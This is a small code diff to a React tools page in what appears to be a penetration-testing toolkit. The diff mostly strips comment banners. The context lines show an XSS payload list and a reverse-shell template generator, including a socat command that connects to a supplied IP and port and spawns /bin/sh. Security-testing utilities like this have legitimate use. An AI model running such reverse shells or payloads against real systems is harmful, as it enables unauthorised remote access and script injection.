@@ -38,9 +38,6 @@ import {
   Filter,
 } from "lucide-react"
 
-// ─────────────────────────────────────────────────────────────
-// Helpers
-// ─────────────────────────────────────────────────────────────
 
 function CopyButton({ text, compact, id }: { text: string; compact?: boolean; id?: string }) {
   const [copied, setCopied] = React.useState(false)
@@ -276,7 +273,7 @@ function cidrInfo(cidr: string) {
   return { network: intToIp(network), broadcast: intToIp(broadcast), netmask, wildcard, prefix, total, usable, first, last, ip: ipStr }
 }
 
-// Payload datasets (curated, real)
+// payloads
 const xssPayloads = [
   { label: "Basic alert", payload: '<script>alert(1)</script>', ctx: "HTML" },
   { label: "Image onerror", payload: '<img src=x onerror=alert(1)>', ctx: "HTML" },
@@ -334,9 +331,6 @@ const shellTemplates: Record<string, (ip: string, port: string, shell?: string) 
   socat: (ip, port) => `socat TCP:${ip}:${port} EXEC:/bin/sh,pty,stderr,setsid,sigint,sane`,
 }
 
-// ─────────────────────────────────────────────────────────────
-// Tool Cards
-// ─────────────────────────────────────────────────────────────
 
 function Base64Tool() {
   const [input, setInput] = React.useState("Hello aegis — toolkit ✓")
@@ -1195,9 +1189,6 @@ function WordlistHelper() {
   )
 }
 
-// ─────────────────────────────────────────────────────────────
-// Page
-// ─────────────────────────────────────────────────────────────
 
 export default function ToolsPage() {
   const [query, setQuery] = React.useState("")
